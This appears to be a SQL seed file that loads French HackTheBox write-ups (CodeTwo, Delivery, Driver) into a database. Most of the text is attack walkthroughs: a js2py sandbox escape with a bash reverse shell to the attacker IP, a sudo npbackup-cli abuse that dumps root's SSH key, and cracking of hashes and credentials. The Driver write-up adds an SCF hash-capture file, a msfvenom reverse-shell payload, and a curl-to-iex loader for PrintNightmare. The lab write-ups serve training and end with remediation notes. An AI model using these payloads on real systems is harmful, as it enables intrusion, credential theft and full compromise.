        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}

// Exécution de la commande
let cmd = "ping -c 1 10.10.14.6";
let res = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
res;
```

Après confirmation de la réception du paquet via `tcpdump`, je modifie la variable `cmd` pour obtenir un **Reverse Shell**.

### Payload Final (Reverse Shell) :
```javascript
let cmd = "bash -c ''bash -i >& /dev/tcp/10.10.14.6/443 0>&1''";
```

### Capture du Shell :
Sur ma machine, j''écoute sur le port 443 :
```bash
nc -lnvp 443
```

Une fois la connexion établie, je stabilise le shell pour obtenir un terminal interactif :
```bash
python3 -c ''import pty; pty.spawn("/bin/bash")''
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je suis maintenant connecté en tant qu''utilisateur **app** sur la machine **codetwo**.

---

### Énumération Post-Exploitation & Pivot vers Marco

Une fois mon accès initial établi en tant qu''utilisateur **app**, je commence par inspecter l''environnement local. Le répertoire personnel contient les sources de l''application Flask et une base de données **SQLite**.

```bash
# Inspection du répertoire de l''application
ls -la /home/app/app/instance/
sqlite3 /home/app/app/instance/users.db
```

Dans la table `user`, je récupère deux entrées contenant des identifiants et des **MD5 password hashes** :
*   **marco** : `649c9d65a206a75f5abe509fe128bce5`
*   **app** : `a97588c0e2fa3a024876339e27aeb42e`

> Schéma Mental : Extraction de Credentials
> 1. Accès Shell (app) -> 2. Lecture de la base SQLite locale -> 3. Extraction des hashes MD5 -> 4. Offline Cracking (CrackStation/Hashcat) -> 5. Pivot horizontal via SSH/su.

Le hash de **marco** est rapidement cassé via **CrackStation**, révélant le mot de passe : `sweetangelbabylove`. Je l''utilise pour migrer vers une session plus stable via **SSH**.

```bash
ssh marco@10.10.11.82
# Password: sweetangelbabylove
```

### Escalade de Privilèges : Abus de NPBackup-cli

En tant que **marco**, j''effectue une énumération des droits **Sudo**. Je remarque immédiatement une configuration permissive pour un utilitaire de sauvegarde.

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**NPBackup** est un wrapper Python autour de l''outil **restic**. L''analyse de l''aide (`-h`) et du fichier de configuration par défaut `~/npbackup.conf` montre que l''outil utilise des fichiers YAML pour définir les sources de sauvegarde et les destinations (**repositories**).

> Schéma Mental : Arbitrary File Read via Backup
> 1. Binaire Sudo (npbackup-cli) -> 2. Contrôle du fichier de configuration (-c) -> 3. Création d''un profil de sauvegarde pointant vers /root -> 4. Exécution de la sauvegarde en tant que root -> 5. Restauration ou lecture des données sauvegardées.

Le fichier `npbackup.conf` original contient des **encrypted strings** pour le mot de passe du repository et l''URI. Je vais détourner cette logique en créant ma propre configuration pour exfiltrer la clé SSH de **root**.

#### 1. Préparation de la configuration malveillante
Je crée un fichier `exploit.conf` dans `/dev/shm`. Je modifie la section `paths` pour inclure `/root/.ssh/id_rsa` et je pointe le `repo_uri` vers un dossier local où j''ai les droits d''écriture.

```yaml
# /dev/shm/exploit.conf (extrait modifié)
repos:
  default:
    repo_uri: /dev/shm/repo
    backup_opts:
      paths:
      - /root/.ssh/id_rsa
      source_type: folder_list
    repo_opts:
      repo_password: password123
```

#### 2. Initialisation et exécution du backup
Puisque je peux exécuter le binaire avec les privilèges **root**, je force la sauvegarde de la clé privée.

```bash
# Initialisation d''un nouveau repository restic local
mkdir /dev/shm/repo
sudo npbackup-cli -c /dev/shm/exploit.conf --init

# Exécution de la sauvegarde (lecture de /root/ en tant que root)
sudo npbackup-cli -c /dev/shm/exploit.conf -b
```

#### 3. Extraction de la clé SSH
Une fois la sauvegarde terminée, j''utilise l''option `--ls` ou `--dump` pour récupérer le contenu du fichier sensible directement depuis le repository créé.

```bash
# Lister les fichiers dans le dernier snapshot
sudo npbackup-cli -c /dev/shm/exploit.conf --ls

# Dump de la clé privée SSH de root
sudo npbackup-cli -c /dev/shm/exploit.conf --dump /root/.ssh/id_rsa > /dev/shm/id_rsa
chmod 600 /dev/shm/id_rsa
```

Il ne me reste plus qu''à utiliser cette clé pour me connecter en tant que **root** via l''interface **loopback** ou directement depuis ma machine d''attaque.

```bash
ssh -i /dev/shm/id_rsa root@127.0.0.1
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois positionné en tant que **marco**, l''énumération du système révèle un vecteur d''élévation de privilèges lié à une configuration **Sudo** permissive et à l''utilisation d''un logiciel de sauvegarde tiers : **NPBackup**.

#### 1. Analyse du vecteur Sudo & NPBackup

L''exécution de `sudo -l` indique que l''utilisateur **marco** peut exécuter `/usr/local/bin/npbackup-cli` avec les privilèges de n''importe quel utilisateur, sans mot de passe.

```bash
marco@codetwo:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**NPBackup** est une surcouche (wrapper) Python construite sur **restic**. Il utilise des fichiers de configuration **YAML** pour définir les **repositories**, les mots de passe et les chemins à sauvegarder. Le fichier de configuration par défaut `npbackup.conf` contient des sections chiffrées/obfusquées (`__NPBACKUP__...`), mais nous n''avons pas besoin de les déchiffrer pour exploiter l''outil.

> **Schéma Mental : Abus de binaire de sauvegarde**
> 1. **Privilège** : Le binaire tourne en tant que **root** via **sudo**.
> 2. **Contrôle** : L''argument `-c` permet de spécifier un fichier de configuration arbitraire.
> 3. **Action** : En créant une configuration pointant vers `/root/`, on force le binaire (sous l''identité **root**) à lire et indexer des fichiers protégés dans un **repository** que nous contrôlons ou dont nous connaissons la structure.
> 4. **Extraction** : Utiliser la fonction `--dump` ou `--restore` pour récupérer les données sensibles.

#### 2. Création d''une configuration malveillante

Je duplique la configuration existante dans `/dev/shm` pour la modifier. L''objectif est de changer le paramètre `paths` pour inclure le répertoire personnel de **root**.

```bash
# Copie de la configuration légitime
cp /home/marco/npbackup.conf /dev/shm/exploit.conf

# Modification du chemin de sauvegarde vers /root/
sed -i ''s|- /home/app/app/|- /root/|'' /dev/shm/exploit.conf
```

#### 3. Exécution de la sauvegarde et extraction des secrets

Je lance la sauvegarde en utilisant la configuration modifiée. Puisque je lance la commande avec `sudo`, **npbackup-cli** a un accès complet en lecture sur `/root/`.

```bash
# Lancement de la sauvegarde (Backup)
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf -b

# Listing des fichiers présents dans le dernier snapshot
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf --ls
```

Une fois le contenu listé, je peux extraire n''importe quel fichier, notamment le flag **root.txt** ou la clé privée SSH de l''administrateur pour obtenir un shell persistant.

```bash
# Lecture du flag root via la fonction dump
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf --dump /root/root.txt

# Extraction de la clé SSH pour persistance
sudo /usr/local/bin/npbackup-cli -c /dev/shm/exploit.conf --dump /root/.ssh/id_rsa > /dev/shm/root_key
chmod 600 /dev/shm/root_key
ssh -i /dev/shm/root_key root@127.0.0.1
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale de **CodeTwo** met en lumière plusieurs faiblesses architecturales critiques :

1.  **Sandbox Escape (CVE-2024-28397)** : L''utilisation de **js2py** pour exécuter du code utilisateur est intrinsèquement risquée. Cette bibliothèque ne fournit pas une isolation de niveau noyau ou conteneur. L''accès aux attributs Python via l''objet JavaScript permet de remonter la chaîne des classes jusqu''à `subprocess.Popen`.
    *   *Remédiation* : Utiliser des moteurs JavaScript isolés comme **Isolate** (v8) ou exécuter le code dans des conteneurs **Docker** éphémères avec des ressources limitées.

2.  **Gestion des secrets en base de données** : Le stockage de hashs **MD5** pour les mots de passe est une pratique obsolète. **MD5** est vulnérable aux attaques par **Rainbow Tables** et aux collisions.
    *   *Remédiation* : Utiliser des algorithmes de hachage modernes avec sel (Salt) et facteur de coût comme **Argon2** ou **bcrypt**.

3.  **Principe du moindre privilège (Sudo)** : Accorder un accès **Sudo** sur un binaire de sauvegarde qui accepte un fichier de configuration arbitraire revient à donner un accès **root** direct. **NPBackup**, en permettant de définir les chemins sources via la configuration utilisateur, devient un vecteur de **Arbitrary File Read**.
    *   *Remédiation* : Restreindre l''utilisation de `sudo` à des scripts wrappers dont les arguments et les chemins de configuration sont statiques et non modifiables par l''utilisateur.

4.  **Obfuscation vs Chiffrement** : Le format `__NPBACKUP__...` dans les fichiers de configuration n''est qu''une forme d''obfuscation (probablement Base64 + un XOR simple ou un chiffrement symétrique avec clé statique). En environnement de production, les secrets de connexion aux **repositories** devraient être gérés via un **Secret Manager** ou des variables d''environnement sécurisées.',
  'HackTheBox',
  'Hard',
  40,
  ARRAY['Active Directory', 'LDAP', 'Exchange', 'PowerShell'],
  'La phase de reconnaissance commence par un **TCP Port Scan** agressif pour identifier la surface d''attaque.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Delivery
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Delivery',
  'hackthebox-delivery',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>



### 1. Reconnaissance & Scanning

Ma méthodologie débute par un **Full TCP Port Scan** pour identifier la surface d''attaque exhaustive, suivi d''un scan de services pour déterminer les versions et les technologies en place.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.222

# Scan détaillé des ports ouverts
nmap -p 22,80,8065 -sC -sV -oA scans/nmap-tcpscans 10.10.10.222
```

**Résultats du scan :**
*   **Port 22 (SSH)** : OpenSSH 7.9p1 (Debian 10).
*   **Port 80 (HTTP)** : Nginx 1.14.2.
*   **Port 8065 (HTTP)** : Instance **Mattermost** (alternative open-source à Slack).

Le scan révèle des noms d''hôtes potentiels. Je mets à jour mon fichier `/etc/hosts` pour assurer une résolution correcte :
```bash
echo "10.10.10.222 delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
```

---

### 2. Énumération des Services Web

L''application sur le port 80 est une page statique qui redirige vers un **HelpDesk** (`helpdesk.delivery.htb`). Une information cruciale est présente : pour accéder au serveur **Mattermost**, il est impératif de posséder une adresse email `@delivery.htb`.

#### HelpDesk (osTicket)
Le sous-domaine héberge une instance de **osTicket**. En explorant les fonctionnalités, je note qu''un utilisateur non authentifié peut "Open a New Ticket". 
Lors de la création d''un ticket, le système génère un **Ticket ID** et indique qu''une adresse email spécifique (ex: `6421357@delivery.htb`) est créée pour permettre la communication bidirectionnelle entre l''utilisateur et le support.

#### Mattermost (Port 8065)
L''instance **Mattermost** permet la création de compte, mais nécessite une validation par email. Comme la machine n''a pas d''accès internet, je ne peux pas utiliser une adresse externe.

> **Schéma Mental : Abus de la logique de communication (Mail Relay)**
> 1. L''attaquant n''a pas d''email `@delivery.htb`.
> 2. Le **HelpDesk** crée une boîte mail temporaire pour chaque ticket ouvert.
> 3. Tout email envoyé à `ID_TICKET@delivery.htb` est automatiquement ajouté comme commentaire/update dans le ticket consultable via l''interface web.
> 4. **Action** : Utiliser l''email du ticket pour s''inscrire sur **Mattermost**, puis lire le lien de vérification directement dans le ticket **osTicket**.

---

### 3. Vecteur d''Entrée : Exploitation du flux d''enregistrement

1.  **Génération de l''email** : Je crée un ticket sur `helpdesk.delivery.htb`. Le système me donne le **Ticket ID** `9832145` et l''email associé `9832145@delivery.htb`.
2.  **Inscription Mattermost** : Je me rends sur `delivery.htb:8065` et je crée un compte en utilisant `9832145@delivery.htb` comme adresse de contact.
3.  **Interception du Token** : Je retourne sur le portail **HelpDesk**, section "Check Ticket Status". En saisissant mon email personnel (utilisé lors de la création du ticket) et le **Ticket ID**, j''accède au contenu du ticket.
4.  **Validation** : Un nouvel update est apparu dans le ticket : c''est l''email de bienvenue de **Mattermost** contenant le lien de validation.

```text
http://delivery.htb:8065/do_verify_email?token=qmk1xu7ctbgdtdfomo36e7sixo...
```

En cliquant sur ce lien, mon compte **Mattermost** est activé.

---

### 4. Premier Shell (Initial Access)

Une fois connecté à **Mattermost**, je rejoins l''équipe "Internal". Dans le canal "Internal", je découvre une conversation entre les administrateurs mentionnant des **Credentials** pour un accès SSH temporaire.

*   **Username** : `maildeliverer`
*   **Password** : `Youve_G0t_Mail!`

Le message précise également que ce mot de passe est une variante de `PleaseSubscribe!` et que des **Hashcat Rules** seront nécessaires plus tard pour l''escalade de privilèges.

J''utilise ces identifiants pour établir une connexion **SSH** :

```bash
ssh maildeliverer@10.10.10.222
# Password: Youve_G0t_Mail!
```

**Validation du premier flag :**
```bash
maildeliverer@Delivery:~$ cat user.txt
6b22a6ae************************
```

---

### Énumération Interne & Mouvement Latéral

Une fois mon accès **SSH** établi avec l''utilisateur `maildeliverer`, je débute l''exploration du système pour identifier des vecteurs d''**Escalade de Privilèges**. L''instance **Mattermost** tournant localement est ma cible prioritaire pour l''énumération de secrets.

#### 1. Analyse de la Configuration Mattermost
Je recherche les fichiers de configuration de l''application. Le fichier `config.json` contient souvent des **Database Credentials** ou des clés d''API.

```bash
# Localisation et lecture de la configuration
cat /opt/mattermost/config/config.json | jq ''.SqlSettings''
```

Le fichier révèle des identifiants **MySQL** en clair : `mmuser` : `Crack_The_MM_Admin_PW`.

> **Schéma Mental :**
> Accès Initial (User) -> Énumération de la Configuration Application -> Extraction de Secrets (DB Creds) -> Pivot vers la Base de Données.

#### 2. Extraction des Hashs de la Base de Données
Je me connecte à l''instance **MariaDB** locale pour extraire les informations de la table des utilisateurs. L''objectif est de récupérer le **Hash** du compte **root**.

```bash
# Connexion à la base de données
mysql -u mmuser -p''Crack_The_MM_Admin_PW'' mattermost

# Extraction des noms d''utilisateurs et des hashs
SELECT Username, Password FROM Users WHERE Username=''root'';
```

Le résultat me donne le hash **bcrypt** suivant pour **root** : `$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO`.

#### 3. Cracking de Mot de Passe (Rule-based Attack)
L''énumération précédente dans les canaux **Mattermost** indiquait que les mots de passe du système sont des variantes de `PleaseSubscribe!`. Au lieu d''une attaque par **Brute Force** classique, j''utilise une **Rule-based attack** avec **Hashcat** pour générer des mutations basées sur ce pattern.

```bash
# Préparation du dictionnaire de base
echo "PleaseSubscribe!" > password.txt

# Attaque Hashcat avec la règle best64
hashcat -m 3200 hash.txt password.txt -r /usr/share/hashcat/rules/best64.rule
```

**Hashcat** parvient à casser le hash rapidement. Le mot de passe identifié est : `PleaseSubscribe!21`.

#### 4. Privilege Escalation vers Root
Le mot de passe extrait de la base de données **Mattermost** est réutilisé pour le compte système **root**. Cette **Password Reuse** est une vulnérabilité critique fréquente dans les environnements où les administrateurs simplifient la gestion de leurs accès.

```bash
# Passage en root
su -
# Saisie du mot de passe : PleaseSubscribe!21

# Vérification de l''identité
id && hostname
```

> **Schéma Mental :**
> Hash de l''application -> Indice de mot de passe (OSINT interne) -> Rule-based Cracking -> Password Reuse (App vers OS) -> Full System Compromise.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant que **maildeliverer**, mon objectif est d''identifier des vecteurs de mouvement latéral ou d''escalade verticale. L''énumération du système de fichiers révèle une instance **Mattermost** installée dans `/opt`.

#### Énumération et Extraction de Secrets

L''analyse des fichiers de configuration de **Mattermost** est une étape critique. Le fichier `config.json` contient souvent des **Database Connection Strings** en clair.

```bash
# Localisation et lecture de la configuration
cat /opt/mattermost/config/config.json | jq ''.SqlSettings''

# Extraction des credentials MySQL
"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?..."
```

> **Schéma Mental :**
> L''application **Mattermost** nécessite un accès permanent à sa base de données pour stocker les messages et les profils. En accédant au fichier de configuration, je récupère les identifiants de l''utilisateur **mmuser**. L''objectif est maintenant de dumper les **Password Hashes** des administrateurs de la plateforme, en espérant une **Password Reuse** avec le compte **Root** du système.

#### Extraction des Hashes via MariaDB

Je me connecte à l''instance **MariaDB** locale pour extraire les données de la table `Users`.

```sql
-- Connexion à la base de données
mysql -u mmuser -pCrack_The_MM_Admin_PW mattermost

-- Extraction des hashes
SELECT Username, Password FROM Users WHERE Username=''root'';

-- Résultat :
-- root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

Le hash identifié utilise l''algorithme **bcrypt** (identifié par le préfixe `$2a$`), ce qui le rend résistant aux attaques par force brute classique sans une stratégie ciblée.

#### Attaque par Dictionnaire avec Hashcat Rules

En me basant sur les indices trouvés précédemment dans les chats **Mattermost**, je sais que les mots de passe suivent un pattern basé sur la chaîne "PleaseSubscribe!". Pour générer les variantes nécessaires, j''utilise une **Rule-based Attack** avec **Hashcat**.

```bash
# Préparation du dictionnaire de base
echo "PleaseSubscribe!" > password.txt

# Attaque avec la règle best64
hashcat -m 3200 hash.txt password.txt -r /usr/share/hashcat/rules/best64.rule --user
```

**Résultat du cracking :** `PleaseSubscribe!21`

#### Compromission Totale

Le mot de passe cracké permet de basculer vers l''utilisateur **Root** via la commande `su`.

```bash
maildeliverer@Delivery:~$ su -
Password: PleaseSubscribe!21
root@Delivery:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Analyse Beyond Root

La compromission totale de **Delivery** met en lumière plusieurs faiblesses architecturales classiques :

1.  **Password Reuse (OS vs Application) :** La vulnérabilité majeure réside dans l''utilisation du même mot de passe (ou d''une variante prévisible) pour le compte administrateur de l''application **Mattermost** et le compte **Root** du système d''exploitation. C''est un vecteur d''escalade critique dans les environnements où la gestion des secrets n''est pas centralisée.
2.  **Hardcoded Credentials :** La présence de mots de passe en clair dans `config.json` est une pratique risquée. Bien que nécessaire pour le fonctionnement de l''application, l''accès à ce fichier aurait dû être restreint de manière plus stricte via des permissions **Linux ACLs** ou l''utilisation d''un **Secret Manager** (type HashiCorp Vault).
3.  **Information Leakage via Internal Chat :** Les communications internes (Mattermost) contenaient des indices sur la politique de mots de passe. Dans un scénario réel, un attaquant surveillerait ces canaux pour identifier des procédures de maintenance ou des déploiements de credentials temporaires.
4.  **Bypass de l''Email Verification :** L''exploitation initiale reposait sur la capacité à recevoir un email de vérification via un système de **HelpDesk** mal configuré. Cela démontre qu''une vulnérabilité de type **Logic Flaw** dans un service périphérique peut mener à la compromission d''une infrastructure de communication interne complète.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['Mattermost', 'Hashcat', 'Ticket system'],
  'Ma méthodologie débute par un **Full TCP Port Scan** pour identifier la surface d''attaque exhaustive, suivi d''un scan de services pour déterminer les versions et les technologies en place.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Driver
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Driver',
  'hackthebox-driver',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>



### 1. Scanning & Énumération

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La cible est une machine Windows.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.106

# Scan détaillé des services identifiés
nmap -p 80,135,445,5985 -sCV -oA scans/nmap-tcpscripts 10.10.11.106
```

**Résultats clés :**
*   **Port 80 (HTTP) :** Microsoft IIS 10.0. Le header `WWW-Authenticate` révèle un **Basic Realm** nommé "MFP Firmware Update Center".
*   **Port 445 (SMB) :** Authentification requise, pas d''accès **Guest** ou **Null Session** fructueux.
*   **Port 5985 (WinRM) :** Ouvert, suggérant un vecteur de shell distant si des credentials sont obtenus.

### 2. Énumération Web & Authentification

En accédant au port 80, une mire d''authentification **Basic Auth** bloque l''accès. L''énumération via **Nmap** a suggéré le nom d''utilisateur `admin`. Une tentative avec les credentials par défaut `admin:admin` permet d''accéder à l''interface.

Le site est une application **PHP** (X-Powered-By: PHP/7.3.25) dédiée à la mise à jour de firmwares d''imprimantes. La page `fw_up.php` présente un formulaire d''upload de fichiers.

> **Schéma Mental : Exploitation du vecteur d''Upload**
> L''application ne semble pas exécuter le code uploadé (pas de **Webshell** direct évident car les fichiers partent sur un share interne). Cependant, si un utilisateur ou un processus système navigue dans le dossier de destination via l''**Explorer Windows**, nous pouvons abuser du mécanisme de résolution d''icônes pour forcer une authentification **SMB** vers notre machine d''attaque.

### 3. Capture de Hash via SCF (Shell Command File)

Puisque les fichiers uploadés sont placés sur un **File Share**, j''utilise un fichier **.scf**. Ce format est traité par l''**Explorer** pour afficher des icônes. En spécifiant un chemin **UNC** vers mon IP, je force la machine cible à tenter une authentification **Net-NTLMv2**.

**Création du payload (0xdf.scf) :**
```ini
[Shell]    
Command=2    
IconFile=\\10.10.14.6\evil.exe,3   
```

**Préparation de l''écouteur :**
J''utilise **Responder** pour intercepter la requête d''authentification entrante.

```bash
sudo responder -I tun0
```

Après avoir uploadé le fichier `0xdf.scf` via le formulaire `fw_up.php`, le système tente d''accéder à la ressource distante pour récupérer l''icône, me fournissant le hash de l''utilisateur **tony**.

### 4. Cracking & Foothold (WinRM)

Le hash récupéré est de type **Net-NTLMv2**. J''utilise **Hashcat** avec la wordlist `rockyou.txt` pour retrouver le mot de passe en clair.

```bash
# Mode 5600 = Net-NTLMv2
hashcat -m 5600 tony_hash.txt /usr/share/wordlists/rockyou.txt
```

**Résultat :** `tony:liltony`

Je vérifie la validité des credentials pour le service **WinRM** avec **CrackMapExec** :

```bash
crackmapexec winrm 10.10.11.106 -u tony -p liltony
```

Le succès de l''authentification (`Pwn3d!`) me permet d''obtenir un shell initial stable via **Evil-WinRM**.

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

Une fois connecté, je peux récupérer le flag `user.txt` dans `C:\Users\tony\Desktop`.

---

### 1. Foothold : Accès initial via WinRM

Après avoir craqué le hash **Net-NTLMv2** de l''utilisateur **tony** (`liltony`), j''utilise **Evil-WinRM** pour établir une session persistante sur la machine. Ce service, écoutant sur le port **5985**, permet une gestion à distance via le protocole **WS-Management**.

```powershell
# Connexion initiale
evil-winrm -i 10.10.11.106 -u tony -p liltony

# Récupération du flag utilisateur
type C:\Users\tony\Desktop\user.txt
```

### 2. Énumération Post-Exploitation

Pour identifier des vecteurs d''**Escalade de Privilèges**, j''utilise **WinPEASx64.exe**. L''analyse se concentre sur les fichiers de configuration, les services mal configurés et l''historique des commandes.

```powershell
# Upload de l''outil d''énumération
upload /path/to/winPEASx64.exe C:\programdata\winPEASx64.exe

# Exécution et filtrage de l''historique PowerShell
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

L''historique révèle une commande critique :
`Add-Printer -PrinterName "RICOH_PCL6" -DriverName ''RICOH PCL6 UniversalDriver V4.23'' -PortName ''lpt1:''`

Cette information, corrélée au nom de la machine (**Driver**), oriente mes recherches vers des vulnérabilités liées aux pilotes d''impression.

> **Schéma Mental : Analyse de la Surface d''Attaque Interne**
> 1. **Contextualisation** : Le nom de la box et l''historique pointent vers le sous-système d''impression (**Spooler**).
> 2. **Vérification des Permissions** : Analyse des répertoires de drivers pour détecter des **Weak Folder Permissions**.
> 3. **Identification** : Découverte du **CVE-2019-19363** lié au driver Ricoh.

---

### 3. Escalade de Privilèges : Exploitation du Driver Ricoh (CVE-2019-19363)

Le driver **RICOH PCL6** présente une vulnérabilité de type **DLL Hijacking**. Lors de son installation, il crée un répertoire dans `C:\programdata\RICOH_DRV\` où tous les utilisateurs (**Everyone**) possèdent les droits de contrôle total (**F**).

```powershell
# Vérification des permissions sur les DLL du driver
icacls C:\programdata\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\*.dll
```

#### Phase d''exploitation avec Metasploit
Le module `exploit/windows/local/ricoh_driver_privesc` automatise le remplacement d''une DLL légitime par une charge malveillante exécutée par **NT AUTHORITY\SYSTEM**.

**Note technique :** L''exploit nécessite souvent une **Session Migration**. Si le processus initial est en **Session 0** (non-interactif), il faut migrer vers un processus en **Session 1** (comme `explorer.exe`) pour interagir correctement avec le spooler d''impression.

```bash
# Préparation du reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe -o rev.exe

# Dans Meterpreter (après exécution de rev.exe)
pgrep explorer
migrate <PID>
use exploit/windows/local/ricoh_driver_privesc
set SESSION <ID>
run
```

---

### 4. Vecteur Alternatif : PrintNightmare (CVE-2021-1675)

La machine est également vulnérable à **PrintNightmare**, une faille critique dans l''**interface RpcAddPrinterDriver** permettant l''exécution de code à distance ou l''escalade de privilèges locale.

> **Schéma Mental : Logique PrintNightmare**
> 1. **Principe** : Abuser de la fonction `AddPrinterDriverEx` pour charger une DLL malveillante via un chemin UNC ou local.
> 2. **Bypass** : Contourner les restrictions de signature de drivers pour forcer le service **Spooler** (tournant en SYSTEM) à charger notre code.

#### Exécution via PowerShell (Bypass Execution Policy)
Pour contourner la **Execution Policy** restreinte, je charge le script directement en mémoire via un **Download String**.

```powershell
# Chargement du script en mémoire (IEX)
curl 10.10.14.6/Invoke-Nightmare.ps1 -UseBasicParsing | iex

# Exécution pour créer un nouvel administrateur local
Invoke-Nightmare -NewUser "redteam" -NewPassword "Password123!"

# Vérification des privilèges
net user redteam
```

Une fois l''utilisateur créé et ajouté au groupe **Administrators**, une nouvelle session **WinRM** permet de récupérer le flag final.

```bash
evil-winrm -i 10.10.11.106 -u redteam -p ''Password123!''
type C:\Users\Administrator\Desktop\root.txt
```

---

### Énumération Post-Exploitation

Une fois mon accès initial établi en tant que **tony**, je commence par une phase d''énumération locale pour identifier des vecteurs d''élévation de privilèges. L''utilisation de **WinPEAS** révèle un élément critique dans l''historique **PowerShell** de l''utilisateur :

```powershell
cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName ''RICOH PCL6 UniversalDriver V4.23'' -PortName ''lpt1:''
```

Le nom de la machine ("Driver") et cet historique pointent directement vers une vulnérabilité liée aux **Print Drivers**. En vérifiant les permissions sur le répertoire du driver Ricoh, je confirme une configuration permissive :

```powershell
icacls "C:\programdata\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\*.dll"
# Résultat : Everyone:(F) -> Contrôle total pour tous les utilisateurs.
```

---

### Vecteur 1 : Exploitation du Driver Ricoh (CVE-2019-19363)

La vulnérabilité **CVE-2019-19363** réside dans le fait que le driver installe des fichiers **DLL** dans un répertoire où les utilisateurs standards disposent de droits d''écriture. Puisque ces **DLLs** sont chargées par des processus tournant avec les privilèges **SYSTEM**, il suffit d''en écraser une pour obtenir une exécution de code privilégiée.

> **Schéma Mental :**
> 1. **Identification** d''un driver tiers (Ricoh) avec des permissions **Weak Folder Permissions**.
> 2. **Hijacking** : Remplacement d''une **DLL** légitime par un **Payload** malveillant.
> 3. **Trigger** : Le service de spooler d''impression charge la **DLL** modifiée.
> 4. **Exécution** : Le code s''exécute dans le contexte de sécurité **NT AUTHORITY\SYSTEM**.

Pour exploiter cela via **Metasploit**, je génère d''abord un **Meterpreter** x64 :

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe -o rev.exe
```

**Note cruciale sur les Sessions Windows :**
L''exploit échoue initialement car mon processus `rev.exe` tourne en **Session 0** (session non-interactive des services). Pour que l''exploit Ricoh fonctionne, je dois **Migrate** vers un processus en **Session 1** (session utilisateur interactive), comme `explorer.exe`.

```msf
meterpreter > ps
meterpreter > migrate -N explorer.exe
msf6 > use exploit/windows/local/ricoh_driver_privesc
msf6 > set SESSION <ID>
msf6 > run
# Résultat : Server username: NT AUTHORITY\SYSTEM
```

---

### Vecteur 2 : PrintNightmare (CVE-2021-1675)

La machine est également vulnérable à **PrintNightmare**, une faille critique dans le **Print Spooler** permettant à un utilisateur authentifié d''installer un driver d''imprimante malveillant.

> **Schéma Mental :**
> 1. **Appel RPC** : Utilisation de `AddPrinterDriverEx` pour enregistrer un nouveau driver.
> 2. **Bypass** : Contournement des vérifications de sécurité pour charger une **DLL** arbitraire depuis un chemin local ou distant.
> 3. **Privilege Escalation** : Le **Spooler** (SYSTEM) exécute le point d''entrée de la **DLL**.

Pour contourner l''**Execution Policy** de PowerShell, j''utilise un **IEX (Invoke-Expression)** pour charger le script en mémoire :

```powershell
# Sur la machine cible via WinRM
curl 10.10.14.6/Invoke-Nightmare.ps1 -UseBasicParsing | iex
Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
```

Le script crée un nouvel utilisateur et l''ajoute au groupe local **Administrators**. Je peux ensuite me reconnecter via **WinRM** avec ces nouveaux identifiants pour une domination totale.

---

### Analyse Beyond Root

L''analyse post-exploitation montre que la compromission de **Driver** repose sur deux piliers majeurs de l''insécurité Windows :

1.  **Gestion des Drivers Tiers** : L''installation de logiciels tiers (ici des drivers d''impression) introduit souvent des **Filesystem Weaknesses**. Le fait que le répertoire `C:\ProgramData` contienne des binaires exécutables avec des permissions **Full Control** pour le groupe `Everyone` est une erreur de configuration classique qui transforme une vulnérabilité logicielle en un vecteur d''attaque trivial.
